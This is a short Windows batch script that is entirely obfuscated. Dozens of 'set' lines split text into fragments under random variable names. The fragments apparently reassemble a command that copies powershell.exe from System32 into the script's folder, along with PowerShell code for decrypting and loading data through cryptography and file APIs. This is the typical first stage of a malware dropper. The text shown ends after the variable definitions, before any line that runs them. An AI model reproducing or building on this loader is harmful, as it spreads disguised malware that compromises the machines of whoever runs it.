@echo off
set "PafKQuUMhC=we"
set "qLLxEyFoPh=co"
set "XEXWcDYaCk=Po"
set "dlApVpzpYz=he"
set "vltZDFlZGR=\v"
set "VpPuAXpOvB=ll"
set "YtgJEbZMBs=he"
set "vkgQPMRVOR=Wi"
set "qMrtqlyrsZ=we"
set "rGmWVEzQPA=xe"
set "ySrdgTLsWV=ow"
set "XyBQzkFfjK=ll"
set "CBucmXGHPp=1."
set "VmbedMahgY=po"
set "IrtYpkaxGz=rS"
set "ihVoTYJYPZ=\W"
set "CSPyCXbHqM=nd"
set "rHYgpKvtUj=rs"
set "UsJdhRZNWL= C"
set "epkkKntFoH=y "
set "HWocCJlTou=s\"
set "uOrCYXArNY=py"
set "bAcZFdqDcL=:\"
set "yPSVaonVOt=.e"
set "QijstBegVB=in"
set "lLQZetCZyr=0\"
set "byZSkGDNVT=em"
set "LitVLvTmVW=32"
set "GXIDWTprER=do"
set "KGhMMUDLZl=ws"
set "UENHFSgiGe= /"
set "adZfijLEwI=Sy"
set "bInqmDSdJV=st"
set "REpZcVIvwb= %~dp0"
set "milAQTLbBF=cd"
set "yYBSlYNVrw=[-1."
set "JbirDOuPId=Gj.T"
set "UrbqrRyxoU=yTo("
set "OauqVBKntq=ypto"
set "EMLfaIpYJg=Z, 0"
set "KQtHWvmATI=File"
set "HmhsQgIfah=Gj ="
set "tNuHcDBuil=;$bx"
set "MAYOhKBNLU=ecry"
set "tGvvEvjxRN=gth)"
set "fPtYqMmdrj=6] -"
set "wphDwILfSM=oI.I"
set "MebUHqdTCq=.Mod"
set "dlyqXtAbYa=ke($"
set "LXCNNJFfBj=ck($"
set "TihVnEcezR=k; }"
set "lxYKWhZVlZ=fore"
set "ptkrqAOilD=Xk.D"
set "NvGTvhozZx=jDww"
set "jZlDvhSFkD=tryP"
set "DmjtzglMRs=y.Ci"
set "DHIvvSabgz=t Sy"
set "kWJlpfHYek=form"
set "mDUwlQOPHX=ct S"
set "TqJOSlbTmI=)($W"
set "toUxySALQU= = ["
set "vJZUZnKPMS=byWX"
set "YorHNWblOI=yste"
set "ZdjQPTHgxq=.Cre"
set "kEreCOauqr=.IO."
set "lcxhurzimg=).Sp"
